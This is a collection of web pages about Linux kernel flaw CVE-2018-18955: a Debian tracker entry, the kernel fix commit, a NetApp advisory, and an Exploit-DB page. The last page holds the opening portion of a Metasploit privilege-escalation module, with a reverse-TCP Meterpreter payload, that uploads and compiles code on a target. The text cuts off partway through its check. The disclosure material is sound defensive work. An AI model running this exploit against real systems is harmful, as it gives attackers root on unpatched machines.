* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from security-tracker.debian.org_35b63461_20250126_033828.html ===

# CVE-2018-18955

| **Name** | CVE-2018-18955 |
| --- | --- |
| **Description** | In the Linux kernel 4.15.x through 4.19.x before 4.19.2, map\_write() in kernel/user\_namespace.c allows privilege escalation because it mishandles nested user namespaces with more than 5 UID or GID ranges. A user who has CAP\_SYS\_ADMIN in an affected user namespace can bypass access controls on resources outside the namespace, as demonstrated by reading /etc/shadow. This occurs because an ID transformation takes place properly for the namespaced-to-kernel direction but not for the kernel-to-namespaced direction. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2018-18955) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-18955); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2018-18955), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2018-18955), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2018-18955), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2018-18955), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-18955), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2018-18955), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2018-18955), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2018-18955)/[CVE](https://www.suse.com/security/cve/CVE-2018-18955/), GitHub [advisories](https://github.com/advisories?query=CVE-2018-18955)/[code](https://github.com/search?type=Code&q=%22CVE-2018-18955%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2018-18955%22), [web search](https://duckduckgo.com/html?q=%22CVE-2018-18955%22), [more](https://oss-security.openwall.org/wiki/vendors)) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [linux](/tracker/source-package/linux) ([PTS](https://tracker.debian.org/pkg/linux)) | bullseye | 5.10.223-1 | fixed |
|  | bullseye (security) | 5.10.226-1 | fixed |
|  | bookworm | 6.1.123-1 | fixed |
|  | bookworm (security) | 6.1.119-1 | fixed |
|  | sid, trixie | 6.12.10-1 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [linux](/tracker/source-package/linux) | source | jessie | (not affected) |  |  |  |
| [linux](/tracker/source-package/linux) | source | stretch | (not affected) |  |  |  |
| [linux](/tracker/source-package/linux) | source | (unstable) | 4.18.20-1 |  |  |  |

## Notes

```
[stretch] - linux <not-affected> (Introduced in 4.15-rc1)
[jessie] - linux <not-affected> (Introduced in 4.15-rc1)
<https://git.kernel.org/linus/d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd>
Introduced in <https://git.kernel.org/linus/6397fac4915a>
<https://bugs.chromium.org/p/project-zero/issues/detail?id=1712>

```

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)



=== Content from git.kernel.org_3d0e34da_20250126_033830.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=d2f007dbe7e4c9583e)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=d2f007dbe7e4c9583e)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583e)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=d2f007dbe7e4c9583e)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Jann Horn <jannh@google.com> | 2018-11-05 20:55:09 +0100 |
| --- | --- | --- |
| committer | Eric W. Biederman <ebiederm@xmission.com> | 2018-11-07 23:51:16 -0600 |
| commit | [d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)) | |
| tree | [9720c07318f1c5591dd3fb67a9bfdc80efc1f2da](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=d2f007dbe7e4c9583e) | |
| parent | [651022382c7f8da46cb4872a545ee1da6d097d2a](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=651022382c7f8da46cb4872a545ee1da6d097d2a) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=d2f007dbe7e4c9583e&id2=651022382c7f8da46cb4872a545ee1da6d097d2a)) | |
| download | [linux-d2f007dbe7e4c9583e.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-d2f007dbe7e4c9583e.tar.gz) | |

userns: also map extents in the reverse map to kernel IDsThe current logic first clones the extent array and sorts both copies, then
maps the lower IDs of the forward mapping into the lower namespace, but
doesn't map the lower IDs of the reverse mapping.
This means that code in a nested user namespace with >5 extents will see
incorrect IDs. It also breaks some access checks, like
inode\_owner\_or\_capable() and privileged\_wrt\_inode\_uidgid(), so a process
can incorrectly appear to be capable relative to an inode.
To fix it, we have to make sure that the "lower\_first" members of extents
in both arrays are translated; and we have to make sure that the reverse
map is sorted \*after\* the translation (since otherwise the translation can
break the sorting).
This is CVE-2018-18955.
Fixes: 6397fac4915a ("userns: bump idmap limits to 340")
Cc: stable@vger.kernel.org
Signed-off-by: Jann Horn <jannh@google.com>
Tested-by: Eric W. Biederman <ebiederm@xmission.com>
Reviewed-by: Eric W. Biederman <ebiederm@xmission.com>
Signed-off-by: Eric W. Biederman <ebiederm@xmission.com>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=d2f007dbe7e4c9583e)

| -rw-r--r-- | [kernel/user\_namespace.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/kernel/user_namespace.c?id=d2f007dbe7e4c9583e) | 12 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 8 insertions, 4 deletions

| diff --git a/kernel/user\_namespace.c b/kernel/user\_namespace.cindex e5222b5fb4fe6c..923414a246e9e4 100644--- a/[kernel/user\_namespace.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/user_namespace.c?id=651022382c7f8da46cb4872a545ee1da6d097d2a)+++ b/[kernel/user\_namespace.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/user_namespace.c?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)@@ -974,10 +974,6 @@ static ssize\_t map\_write(struct file \*file, const char \_\_user \*buf, if (!new\_idmap\_permitted(file, ns, cap\_setid, &new\_map)) goto out; - ret = sort\_idmaps(&new\_map);- if (ret < 0)- goto out;- ret = -EPERM; /\* Map the lower ids from the parent user namespace to the \* kernel global id space.@@ -1004,6 +1000,14 @@ static ssize\_t map\_write(struct file \*file, const char \_\_user \*buf, e->lower\_first = lower\_first; } + /\*+ \* If we want to use binary search for lookup, this clones the extent+ \* array and sorts both copies.+ \*/+ ret = sort\_idmaps(&new\_map);+ if (ret < 0)+ goto out;+ /\* Install the map \*/ if (new\_map.nr\_extents <= UID\_GID\_MAP\_MAX\_BASE\_EXTENTS) { memcpy(map->extent, new\_map.extent, |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-26 03:37:07 +0000



=== Content from security.netapp.com_be0f2af4_20250126_033837.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [CVE-2018-18955 Linux Kernel Vulnerability in NetApp Products](https://security.netapp.com/advisory/ntap-20190416-0003)

## CVE-2018-18955 Linux Kernel Vulnerability in NetApp Products

circle-check-alt

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20190416-0003 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20190416-0003 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20190416-0003 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20190416-0003 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20190416-0003
**Version:**
3.0

**Last updated:**
07/31/2019

**Status:**
Final.

**CVEs:** CVE-2018-18955

Overview
#### Summary

Multiple NetApp products incorporate Linux kernel. Linux kernel versions 4.15.x through 4.19.x before 4.19.2 are susceptible to a vulnerability which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data or Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability could lead to disclosure of sensitive information, addition or modification of data or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2018-18955](https://nvd.nist.gov/vuln/detail/CVE-2018-18955) | 7.0 (HIGH) | CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

Affected Products
#### Affected Products

* Cluster Network Switch (NetApp CN1610)
* SnapProtect

#### Products Not Affected

* 7-Mode Transition Tool
* ATTO FibreBridge
* Active IQ Unified Manager (formerly OnCommand Unified Manager) for Linux 7.3 and above
* Active IQ Unified Manager (formerly OnCommand Unified Manager) for VMware vSphere 9.5 and above
* Active IQ Unified Manager (formerly OnCommand Unified Manager) for Windows 7.3 and above
* Brocade Fabric Operating System Firmware
* Brocade Network Advisor Software
* Clustered Data ONTAP
* Clustered Data ONTAP Antivirus Connector
* Data ONTAP operating in 7-Mode
* E-Series SANtricity Management Plug-ins (VMware vCenter)
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Storage Manager
* E-Series SANtricity Web Services (REST API) for Web Services Proxy
* Element Plug-in for vCenter Server
* FAS/AFF BIOS
* FAS/AFF Baseboard Management Controller (BMC)
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* MetroCluster Tiebreaker for clustered Data ONTAP
* NetApp Cloud Backup (formerly AltaVault)
* NetApp Cloud Backup OST Plug-in (formerly AltaVault OST Plug-in)
* NetApp Converged Systems Advisor Agent
* NetApp Element System Firmware
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Nodes
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp Plug-in for Symantec NetBackup
* NetApp SANtricity Cloud Connector
* NetApp SANtricity SMI-S Provider
* NetApp SMI-S Provider
* NetApp Service Level Manager
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire & HCI Storage Node (Element Software)
* NetApp SteelStore Cloud Integrated Storage
* NetApp Storage Encryption
* NetApp VASA Provider for Clustered Data ONTAP 7.2 and above
* ONTAP Select Deploy administration utility
* OnCommand API Services
* OnCommand Cloud Manager
* OnCommand Insight
* OnCommand System Manager 9.x
* OnCommand Unified Manager for 7-Mode (core package)
* OnCommand Workflow Automation
* Open Systems SnapVault Agent
* RAID Controller CTS2600 Legacy Engenio
* SAS Firmware
* Service Processor
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapDrive for Unix
* SnapDrive for Windows
* SnapManager for Exchange
* SnapManager for Hyper-V
* SnapManager for MS SQL
* SnapManager for Oracle
* SnapManager for SAP
* SnapManager for Sharepoint
* Storage Replication Adapter for Clustered Data ONTAP for VMware vSphere 7.2 and above
* Storage Replication Adapter for Clustered Data ONTAP for Windows 7.2 and above
* Storage Services Connector
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID Baseboard Management Controller (BMC)
* StorageGRID Webscale NAS Bridge
* StorageGRID9 (9.x and prior)
* System Setup
* Virtual Storage Console for VMware vSphere 7.2 and above

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **Cluster Network Switch (NetApp CN1610)** | Cluster Network Switch (NetApp CN1610) has no plans to address this vulnerability. |
| **SnapProtect** | SnapProtect has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2426797.html) for more information. |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Final.**

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20190416-0003>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20190416 | Initial Public Release |
| 2.0 | 20190531 | SnapProtect moved to Won't Fix status |
| 3.0 | 20190731 | Cluster Network Switch (NetApp CN1610) moved to Won't Fix status, Final status |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from github.com_e054fe3d_20250124_213106.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2Fd2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2Fd2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=torvalds%2Flinux)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[torvalds](/torvalds)
/
**[linux](/torvalds/linux)**
Public

* [Notifications](/login?return_to=%2Ftorvalds%2Flinux) You must be signed in to change notification settings
* [Fork
  54.9k](/login?return_to=%2Ftorvalds%2Flinux)
* [Star
   186k](/login?return_to=%2Ftorvalds%2Flinux)

* [Code](/torvalds/linux)
* [Pull requests
  437](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects
  0](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

Additional navigation options

* [Code](/torvalds/linux)
* [Pull requests](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

## Commit

[Permalink](/torvalds/linux/commit/d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

userns: also map extents in the reverse map to kernel IDs

[Browse files](/torvalds/linux/tree/d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd)
Browse the repository at this point in the history

```
The current logic first clones the extent array and sorts both copies, then
maps the lower IDs of the forward mapping into the lower namespace, but
doesn't map the lower IDs of the reverse mapping.

This means that code in a nested user namespace with >5 extents will see
incorrect IDs. It also breaks some access checks, like
inode_owner_or_capable() and privileged_wrt_inode_uidgid(), so a process
can incorrectly appear to be capable relative to an inode.

To fix it, we have to make sure that the "lower_first" members of extents
in both arrays are translated; and we have to make sure that the reverse
map is sorted *after* the translation (since otherwise the translation can
break the sorting).

This is [CVE-2018-18955](https://github.com/advisories/GHSA-c6xj-3c77-g5rg "CVE-2018-18955").

Fixes: [6397fac](https://github.com/torvalds/linux/commit/6397fac4915ab3002dc15aae751455da1a852f25) ("userns: bump idmap limits to 340")
Cc: stable@vger.kernel.org
Signed-off-by: Jann Horn <jannh@google.com>
Tested-by: Eric W. Biederman <ebiederm@xmission.com>
Reviewed-by: Eric W. Biederman <ebiederm@xmission.com>
Signed-off-by: Eric W. Biederman <ebiederm@xmission.com>
```

* Loading branch information

[![@thejh](https://avatars.githubusercontent.com/u/499370?s=40&v=4)](/thejh) [![@ebiederm](https://avatars.githubusercontent.com/u/7477136?s=40&v=4)](/ebiederm)

[thejh](/torvalds/linux/commits?author=thejh "View all commits by thejh")
authored and
[ebiederm](/torvalds/linux/commits?author=ebiederm "View all commits by ebiederm")
committed
Nov 8, 2018

1 parent
[6510223](/torvalds/linux/commit/651022382c7f8da46cb4872a545ee1da6d097d2a)

commit d2f007d

Showing
**1 changed file**
with
**8 additions**
and
**4 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

12 changes: 8 additions & 4 deletions

12
[kernel/user\_namespace.c](#diff-5ed7c9c3a2bfc22c99debf409d123ff561727de5cf584817b0724df49aa628bd "kernel/user_namespace.c")

Show comments

[View file](/torvalds/linux/blob/d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd/kernel/user_namespace.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -974,10 +974,6 @@ static ssize\_t map\_write(struct file \*file, const char \_\_user \*buf, |
|  |  | if (!new\_idmap\_permitted(file, ns, cap\_setid, &new\_map)) |
|  |  | goto out; |
|  |  |  |
|  |  | ret = sort\_idmaps(&new\_map); |
|  |  | if (ret < 0) |
|  |  | goto out; |
|  |  |  |
|  |  | ret = -EPERM; |
|  |  | /\* Map the lower ids from the parent user namespace to the |
|  |  | \* kernel global id space. |
| Expand All | | @@ -1004,6 +1000,14 @@ static ssize\_t map\_write(struct file \*file, const char \_\_user \*buf, |
|  |  | e->lower\_first = lower\_first; |
|  |  | } |
|  |  |  |
|  |  | /\* |
|  |  | \* If we want to use binary search for lookup, this clones the extent |
|  |  | \* array and sorts both copies. |
|  |  | \*/ |
|  |  | ret = sort\_idmaps(&new\_map); |
|  |  | if (ret < 0) |
|  |  | goto out; |
|  |  |  |
|  |  | /\* Install the map \*/ |
|  |  | if (new\_map.nr\_extents <= UID\_GID\_MAP\_MAX\_BASE\_EXTENTS) { |
|  |  | memcpy(map->extent, new\_map.extent, |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `d2f007d`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2Fd2f007dbe7e4c9583eea6eb04d60001e85c6f1bd) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.exploit-db.com_dcdf676b_20250124_213130.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Linux - Nested User Namespace idmap Limit Local Privilege Escalation (Metasploit)

#### EDB-ID:

###### 45915

#### CVE:

###### [2018-18955](https://nvd.nist.gov/vuln/detail/CVE-2018-18955)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2018-11-29

---

**Vulnerable App:**

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Linux Nested User Namespace idmap Limit Local Privilege Escalation',
      'Description'    => %q{
        This module exploits a vulnerability in Linux kernels 4.15.0 to 4.18.18,
        and 4.19.0 to 4.19.1, where broken uid/gid mappings between nested user
        namespaces and kernel uid/gid mappings allow elevation to root
        (CVE-2018-18955).

        The target system must have unprivileged user namespaces enabled and
        the newuidmap and newgidmap helpers installed (from uidmap package).

        This module has been tested successfully on:

        Fedora Workstation 28 kernel 4.16.3-301.fc28.x86_64;
        Kubuntu 18.04 LTS kernel 4.15.0-20-generic (x86_64);
        Linux Mint 19 kernel 4.15.0-20-generic (x86_64);
        Ubuntu Linux 18.04.1 LTS kernel 4.15.0-20-generic (x86_64).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Jann Horn', # Discovery and exploit
          'bcoles'     # Metasploit
        ],
      'DisclosureDate' => 'Nov 15 2018',
      'Platform'       => ['linux'],
      'Arch'           => [ARCH_X86, ARCH_X64],
      'SessionTypes'   => ['shell', 'meterpreter'],
      'Targets'        => [['Auto', {}]],
      'Privileged'     => true,
      'References'     =>
        [
          ['BID', '105941'],
          ['CVE', '2018-18955'],
          ['EDB', '45886'],
          ['PACKETSTORM', '150381'],
          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1712'],
          ['URL', 'https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955'],
          ['URL', 'https://lwn.net/Articles/532593/'],
          ['URL', 'https://bugs.launchpad.net/bugs/1801924'],
          ['URL', 'https://people.canonical.com/~ubuntu-security/cve/CVE-2018-18955'],
          ['URL', 'https://security-tracker.debian.org/tracker/CVE-2018-18955'],
          ['URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd'],
          ['URL', 'https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.18.19'],
          ['URL', 'https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.19.2']
        ],
      'DefaultTarget'  => 0,
      'DefaultOptions' =>
        {
          'AppendExit'       => true,
          'PrependSetresuid' => true,
          'PrependSetreuid'  => true,
          'PrependSetuid'    => true,
          'PrependFork'      => true,
          'WfsDelay'         => 60,
          'PAYLOAD'          => 'linux/x86/meterpreter/reverse_tcp'
        },
      'Notes' =>
        {
          'AKA' => ['subuid_shell.c']
        }
      ))
    register_options [
      OptEnum.new('COMPILE', [true, 'Compile on target', 'Auto', %w[Auto True False]])
    ]
    register_advanced_options [
      OptBool.new('ForceExploit',  [false, 'Override check result', false]),
      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
    ]
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
  end

  def upload_and_compile(path, data)
    upload "#{path}.c", data

    gcc_cmd = "gcc -o #{path} #{path}.c"
    if session.type.eql? 'shell'
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end
    output = cmd_exec gcc_cmd

    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile. Set COMPILE False to upload a pre-compiled executable."
    end

    register_file_for_cleanup path
    chmod path, 0755
  end

  def exploit_data(file)
    ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2018-18955', file)
  end

  def live_compile?
    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')

    if has_gcc?
      vprint_good 'gcc is installed'
      return true
    end

    unless datastore['COMPILE'].eql? 'Auto'
      fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'
    end
  end

  def check
    unless userns_enabled?
      vprint_error 'Unprivileged user namespaces are not permitted'
      return CheckCode::Safe
    end
    vprint_good 'Unprivileged user namespaces are permitted'

    ['/usr/bin/newuidmap', '/usr/bin/newgidmap'].each do |path|
      unless setuid? path
        vprint_error "#{path} is not set-uid"
        return CheckCode::Safe
      end
      vprint_good "#{path} is set-uid"
    end

    # Patched in 4.18.19 and 4.19.2
    release = kernel_release
    v = Gem::Version.new release.split('-').first
    if v < Gem::Version.new('4.15') ||
       v >= Gem::Version.new('4.19.2') ||
       (v >= Gem::Version.new('4.18.19') && v < Gem::Version.new('4.19'))
      vprint_error "Kernel version #{release} is not vulnerable"
      return CheckCode::Safe
    end
